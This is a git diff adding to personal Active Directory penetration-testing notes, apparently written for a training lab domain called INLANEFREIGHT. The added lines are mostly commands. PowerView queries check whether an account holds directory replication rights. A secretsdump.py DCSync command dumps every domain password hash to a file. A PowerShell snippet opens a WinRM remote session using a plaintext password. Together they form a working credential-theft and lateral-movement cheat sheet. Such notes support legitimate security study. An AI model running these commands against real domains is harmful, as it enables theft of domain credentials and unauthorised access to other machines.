@@ -162,3 +162,20 @@ $sid = Convert-NameToSid <name>
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
 ```
 
+DSync - You must have (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set.
+```
+Get-DomainUser -Identity <domain-user-with-replication-rights>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+$sid= "<S-1-5-21-SID-OF-USER-FROM-LAST-COMMAND>"
+import-module Powerview.ps1
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl //checks to make sure the user has the rights.
+
+from a linux box
+secretsdump.py -outputfile hashes.txt -just-dc INLANEFREIGHT/<user-with-replication-rights-@<172.16.5.5>
+```
+
+Establish winrm sessions from windows 
+```
+$password = ConvertTo-SecureString "<known-password-of-a-domain-user>" -AsPlainText -Force
+$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\<name-of-domain-user>", $password)
+Enter-PSSession -ComputerName <Name-of-computer-to-enter> -Credential $cred
+```
